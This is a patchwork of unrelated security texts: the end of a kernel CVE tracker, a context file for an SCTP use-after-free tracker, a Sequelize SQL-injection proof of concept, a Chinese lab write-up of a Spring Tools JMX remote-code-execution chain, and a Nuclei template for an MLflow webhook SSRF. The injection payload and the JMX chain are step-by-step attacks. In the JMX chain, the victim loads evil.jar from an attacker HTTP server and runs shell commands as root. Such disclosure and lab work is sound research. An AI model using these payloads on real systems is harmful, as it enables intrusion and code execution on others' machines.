  and 7.x below 7.1.6 is **≥ v5.1 and in-window**.
- Unlike the SCTP-family trackers, **`:heavy_minus_sign: Not affected` CAN
  legitimately apply** — to a kernel whose `net/sched` predates the
  unlocked `cls_flower` path (Red Hat records RHEL 6/7's 2.6.32 / 3.10 as
  `vulnerable_code_not_present`).  Take a not-affected verdict from the CNA
  `.dyad` or the Red Hat VEX, **never** from a base version alone.

**CVE-2026-68138** is assigned by the kernel CNA and published 2026-08-10.
Discovered by **A. Ramos** ([@aramosf](https://twitter.com/aramosf)), who
published a **complete working exploit** (`exploit.c`, escalating uid 1000
to root) at <https://github.com/aramosf/CVE-2026-68138> on 2026-08-12.
Treat this as exploited-in-practice.

Reaching the bug needs, as **reachability** (prose, not a verdict axis):

- **`CAP_NET_ADMIN` in a network namespace.**  Non-GET rtnetlink handlers
  require it.  An unprivileged user obtains it via `unshare -Urn` **where
  unprivileged user namespaces are enabled**
  (`kernel.unprivileged_userns_clone` / `user.max_user_namespaces > 0`); a
  process or container already holding `CAP_NET_ADMIN` reaches it directly.
- **`cls_flower` + `act_police`.**  Both autoload on a `tc … flower …
  action police` command.  The vulnerable rate-table code itself is core
  `net/sched`, built in with `CONFIG_NET_SCHED` — **there is no
  "module not present" escape** for the datapath.
- **≥ 2 CPUs** to win the race (the public exploit uses 4 vCPUs).

These are reachability conditions, not verdict axes — an affected,
unpatched kernel is `:x:` regardless of a host's user-namespace posture.

Only **one** CVSS vantage exists — local (`AV:L`).  The kernel CNA scores
it CVSS 3.1 **7.8 HIGH** (`AC:L`); Red Hat scores it **7.0 HIGH** (`AC:H`),
differing only on attack complexity.  Both belong in the Summary / the
`#### Scoring` verification-log subsection.

CVE-2026-68138 is a single, self-contained bug — there is **no** companion
tracker to cross-reference.

# SCTPhantom Tracking — Claude Code Context

This repository contains a living tracking document for **SCTPhantom**
(**CVE-2026-64564**), a **use-after-free** in the Linux kernel **SCTP**
stack.  `sctp_process_asconf()` caches the transport an ASCONF chunk is
processed against in `asconf->transport`.  An ASCONF carrying, in order,
`[Address Parameter L][DEL-IP L][DEL-IP 0.0.0.0]` — where `L` differs from
the packet source — makes the `DEL-IP L` pass the D8 source-address check
and free the still-cached transport via `sctp_assoc_rm_peer()`
(RCU-deferred); the wildcard `DEL-IP 0.0.0.0` then reuses the dangling
`asconf->transport` in `sctp_assoc_set_primary()` and
`sctp_assoc_del_nonprimary_peers()`, planting freed memory into
`asoc->peer.primary_path` / `active_path` (`net/sctp/sm_make_chunk.c`).
Impact: a reproducible kernel oops/panic (**DoS**) and, per the
discoverers, **local privilege escalation** and **container-to-host
escape**.

The canonical fix is [`9b2854f86f0b`][fix] (*sctp: don't free the ASCONF's
own transport in DEL-IP processing*), first released in **v7.2-rc5**.
**Crucially, this is an ANCIENT bug, not a regression**: the flaw was
introduced by `42e30bf3463c` (ASCONF DEL-IP support) in **v2.6.25** (2008),
so **every maintained SCTP-capable kernel is in-window**.  There is **no
"predates the introducing commit / not affected" case** — a kernel is safe
only by carrying the fix, never by being old.

**CVE-2026-64564** is assigned by the kernel CNA.  Discovered by **Corvus
AI** (Tencent Zhuque Lab / TencentOS Security Team), disclosed 2026-08-06 in
a [write-up][writeup].  **No public PoC** — the researchers report internal
PoCs for local privesc and container escape but released no code.

Reaching the bug needs the **`sctp` module in use** (autoloaded on first
SCTP socket on most distros; on Rocky/RHEL 8/9/10 alike `sctp.ko` ships in
`kernel-modules-extra`, which installs a `blacklist sctp` config, so it
never autoloads there), an association with the **ADD-IP / ASCONF**
extension negotiated, and a valid
**AUTH** chunk.  Both ADD-IP and AUTH can be enabled **per socket**
(`SCTP_ASCONF_SUPPORTED` / `SCTP_AUTH_SUPPORTED`, no privilege, no
`CAP_NET_ADMIN`), so a local attacker turns them on and authenticates its
own ASCONF; the `net.sctp.addip_enable` / `addip_noauth_enable` sysctls
bound only the **remote** surface, not the local privesc/container path.
These are reachability conditions, not verdict axes.

Two scores exist and both belong in the Summary: the **kernel CNA** scores
it CVSS 3.1 **9.8 CRITICAL** (`AV:N`, remote SCTP peer); the
**discoverers** score CVSS 4.0 **8.5 HIGH** (`AV:L`, demonstrated local
priv-esc).  The divergence is vantage point, not disagreement on the flaw.

SCTPhantom is a single, self-contained bug — there is **no** companion tracker
to cross-reference.

The rendered site is published at <https://kimmo.cloud/sctphantom/>.

# CVE-2026-30951 Sequelize JSON Cast SQL Injection

**★ CVE-2026-30951 Sequelize ORM SQL Injection PoC ★**

https://github.com/user-attachments/assets/30b19211-890a-4780-acd9-04856ec98381

# Overview

> **CVE-2026-30951** is a **SQL Injection** vulnerability in **Sequelize v6**, a widely used Node.js ORM.
> 
> The vulnerability exists in JSON/JSONB `where` clause processing. When Sequelize parses a JSON path key containing `::`, the value after `::` is treated as a SQL cast type and is inserted into the generated SQL without proper validation.
> 
> If an attacker can control JSON object keys passed into a Sequelize `where` clause, they can manipulate the generated SQL query.

# Affected Versions

| Category | Version |
| --- | --- |
| **Vulnerable** | Sequelize **v6.x \<= 6.37.7** |
| **Patched** | Sequelize **6.37.8** |
| **Not affected** | Sequelize v7 / `@sequelize/core` |

# Impact

*   SQL injection through attacker-controlled JSON object keys
*   Search filter bypass through boolean-based injection
*   Unintended query condition manipulation inside ORM-generated SQL

# Environment

This repository contains a minimal vulnerable Node.js, Express, Sequelize, and SQLite challenge app.

## Local Run

npm install
npm start
```

# PoC

After starting the vulnerable environment, follow the steps below to reproduce the injection.

## Step 1. Send a normal search request

```
POST /api/users/search
Content-Type: application/json

{
  "filter": {
    "name": "emma"
  }
}
```

This returns only users matching the normal name search logic.

## Step 2. Trigger a boolean-based SQL injection

```
POST /api/users/search
Content-Type: application/json

{
  "filter": {
    "name::text) or 1=1--": "emma"
  }
}
```

Expected result:

```
All user rows are returned.
```

## Step 3. Confirm that SQL injection occurred

The crafted JSON key causes Sequelize to generate a cast expression similar to:

```
CAST(json_extract(`User`.`metadata`, '$.name') AS TEXT) OR 1=1--)
```

Because the cast type is attacker-controlled, the `OR 1=1` condition changes the intended `WHERE` clause behavior. Returning all rows from the same search endpoint confirms that SQL injection is possible.

## Analysis

### Technical Root Cause

The vulnerability is caused by insufficient validation of JSON cast types in Sequelize v6.

Internally, Sequelize's JSON traversal logic splits JSON path keys on `::`:

```
jsonKey::castType
```

The cast type is then used in generated SQL like:

```
CAST(<json_extract_expression> AS <cast_type>)
```

In vulnerable versions, `<cast_type>` is not safely escaped or restricted to a known-safe allowlist. This allows an attacker-controlled JSON key to break out of the cast expression and inject SQL.

### Dangerous Pattern

Any application pattern similar to the following may be vulnerable when using affected Sequelize versions:

```
app.post('/api/users/search', async (req, res) => {
  const users = await User.findAll({
    where: {
      metadata: req.body.filter
    }
  });

  res.json(users);
});
```

This is dangerous because the attacker controls not only JSON values, but also JSON object keys.

### Why This Matters

This vulnerability is especially dangerous because many developers assume ORM query builders automatically protect against SQL injection. In this case, the injection happens inside ORM-generated SQL, after the application has already passed structured JavaScript objects to Sequelize.

Depending on the application logic, exploitation may allow:

*   bypassing intended search filters
*   altering boolean query conditions
*   changing the behavior of ORM-generated SQL

This is fundamentally a **CWE-89: Improper Neutralization of Special Elements used in an SQL Command** issue.

# CVE-2026-47858 复现实验记录

**漏洞**: Spring Tools (Eclipse ≤5.2.0 / VSCode/Cursor/Theia ≤2.2.0) 以 live information 模式启动
Spring Boot 应用时, 给应用注入不安全的 JMX 远程参数, 导致未授权 JMX → 远程代码执行 (RCE)。

**官方信息**:
- 公告: https://spring.io/security/cve-2026-47858
- CVE: https://www.cve.org/CVERecord?id=CVE-2026-47858
- CWE-306 (Missing Authentication for Critical Function), CVSS 8.0 HIGH (AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

## 一键复现

```bash
# 依赖: docker, JDK 17+ (默认 /usr/lib/jvm/java-21-openjdk-amd64), maven, python3
./run-lab.sh vuln          # 漏洞配置 (Spring Tools 5.2.0 参数) -> 应弹出 RCE 证据
./run-lab.sh fixed-pinned  # 修复版 5.3.0 固定端口 -> 攻击失败 (JMX 仅监听 127.0.0.1)
./run-lab.sh fixed-auto    # 修复版 5.3.0 默认 auto -> 攻击失败 (无远程 JMX 端口)
```

脚本会自动: 构建受害 Spring Boot 应用 → 构建恶意 jar → 创建隔离 docker 桥接网络
(受害容器 172.22.0.x / 攻击者在宿主机, 模拟相邻网络) → 按对应版本的 JVM 参数启动应用 →
展示监听端口 → 运行利用程序 → 在受害容器内验证 RCE 标记文件。

## 根因 (源码证据, tag 5.2.0.RELEASE == v2.2.0)

`eclipse-extensions/.../boot/launch/livebean/JmxBeanSupport.java` (5.2.0):
```java
"-Dcom.sun.management.jmxremote",                 // 启用 JMX
"-Dcom.sun.management.jmxremote.port=<随机空闲端口>",
"-Dcom.sun.management.jmxremote.authenticate=false",  // 无认证!
"-Dcom.sun.management.jmxremote.ssl=false",           // 无 TLS!
"-Djava.rmi.server.hostname=localhost",               // 唯一的"障碍": stub 通告 localhost
"-Dspring.jmx.enabled=true",
"-Dmanagement.endpoints.jmx.exposure.include=*"       // 所有 actuator 端点经 JMX 暴露
```
- `BootLaunchConfigurationDelegate.DEFAULT_ENABLE_JMX = true` (默认开启)
- 修复版 5.3.0 增加 `-Dcom.sun.management.jmxremote.host=127.0.0.1` + `-Dcom.sun.management.jmxremote.local.only=true`;
  默认端口 0 时完全不再注入 jmxremote 参数 (改为 Attach API 按 PID 本地附加)。
- VSCode 扩展 2.2.0 (`vscode-extensions/vscode-spring-boot/lib/debug-config-provider.ts`) 同样注入
  `-Dcom.sun.management.jmxremote.port=<port> -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false`;
  2.3.0 中完全移除。

## 实验环境

- 受害应用: Spring Boot 4.0.7 (web+actuator), jar 见 `victim-app/app/target/app-0.0.1-SNAPSHOT.jar`
- 受害容器: docker `victim` (bridge 网络 cve-lab, IP 172.22.0.2), 用与 STS 5.2.0 完全相同的 JVM 参数启动
- 攻击者: 宿主 (同网段 172.22.0.1, 相邻网络), Java 程序 `attacker/JmxExploit.java`
- 恶意载荷: `exploit-server/evil.jar` (类 `Pwn`, 实现 DynamicMBean, 构造函数执行命令) +
  `exploit-server/mlet.txt` (MLET 标签), 经 HTTP 提供

### 攻击链路 (漏洞版)
1. 连接受害机 RMI 注册表 `172.22.0.2:19090`, 找到绑定 `jmxrmi`
2. 朴素客户端直接调用 → 失败: `Connection refused to host: localhost` (stub 通告 localhost)
3. 反射改写 stub 的 TCPEndpoint 主机为真实 IP → `RMIServer.newClient(null)` 无凭据连接成功,
   可见 39~40 个 MBean (含所有 JVM MBean 与 Spring Boot actuator 端点)
4. 注册 `javax.management.loading.MLet`, 调 `getMBeansFromURL("http://<attacker>/mlet.txt")`
5. 受害 JVM 从攻击者 HTTP 下载 `evil.jar`, 实例化 `Pwn` → 构造函数执行
   `/bin/sh -c "id; hostname; echo PWNED_BY_CVE-2026-47858 > /tmp/CVE-2026-47858_PWNED_info"`

### 受害容器内验证 (RCE 成功)

/tmp/CVE-2026-47858_PWNED_cmdout = uid=0(root) gid=0(root) groups=0(root)
                                   d4af4b454b90   <-- 受害容器主机名
```

## 结论

**漏洞真实存在**。Spring Tools 5.2.0 (及之前) 默认开启的 live information 模式会把
Spring Boot 应用以"JMX 无认证 + 无 TLS + 绑定所有网卡"的方式启动, 相邻网络的攻击者
可绕过 `java.rmi.server.hostname=localhost` 通告 (改写 RMI stub 主机), 以无凭据方式连接
JMX MBeanServer, 并通过 MLet 远程类加载实现任意命令执行 (root 权限)。5.3.0/2.3.0 修复版
将 JMX 绑定到 127.0.0.1 (固定端口) 或完全移除远程 JMX (默认 auto 模式), 攻击被阻断。

id: CVE-2026-64849

info:
  name: MLflow Webhook SSRF - Unauthenticated Full-Read via Redirect Bypass
  author: DhiyaneshDk
  severity: critical
  description: |
    MLflow > 3.15.0 contains an information disclosure vulnerability caused by improper validation of webhook URLs allowing attackers to reach internal or cloud metadata services and obtain response details, exploit requires unauthenticated access to the webhook test endpoint.
  impact: |
    Attackers can access internal or cloud metadata services and retrieve response status and body, potentially exposing sensitive information.
  remediation: |
    Upgrade MLflow to a version containing PR #24258 which adds SSRFProtectedHTTPAdapter for connection-time IP validation covering redirect targets and DNS rebinding.
  reference:
    - https://github.com/mlflow/mlflow/security/advisories/GHSA-7gwp-5pfp-969j
    - https://github.com/mlflow/mlflow/pull/24258
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 9.3
    cve-id: CVE-2026-64849
    epss-score: 0.00349
    epss-percentile: 0.27929
    cwe-id: CWE-918
  metadata:
    max-request: 3
    verified: true
    shodan-query: http.title:"MLflow"
    fofa-query: title="MLflow"
  tags: cve,cve2026,mlflow,ssrf,oast,webhook,oss,vkev

variables:
  random: "{{rand_text_alpha(8)}}"

http:
  - raw:
      - |
        POST /api/2.0/mlflow/webhooks HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"name":"{{random}}","url":"https://{{interactsh-url}}","events":[{"entity":"REGISTERED_MODEL","action":"CREATED"}]}

      - |
        POST /api/2.0/mlflow/webhooks/{{webhook_id}}/test HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"webhook_id":"{{webhook_id}}","event":{"entity":"REGISTERED_MODEL","action":"CREATED"}}

      - |
        DELETE /api/2.0/mlflow/webhooks/{{webhook_id}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - "webhook_id"
          - "ACTIVE"
        condition: and

      - type: word
        part: interactsh_protocol
        words:
          - "http"

    extractors:
      - type: regex
        name: webhook_id
        part: body
        internal: true
        regex:
          - '"webhook_id":\s*"([^"]+)"'
        group: 1
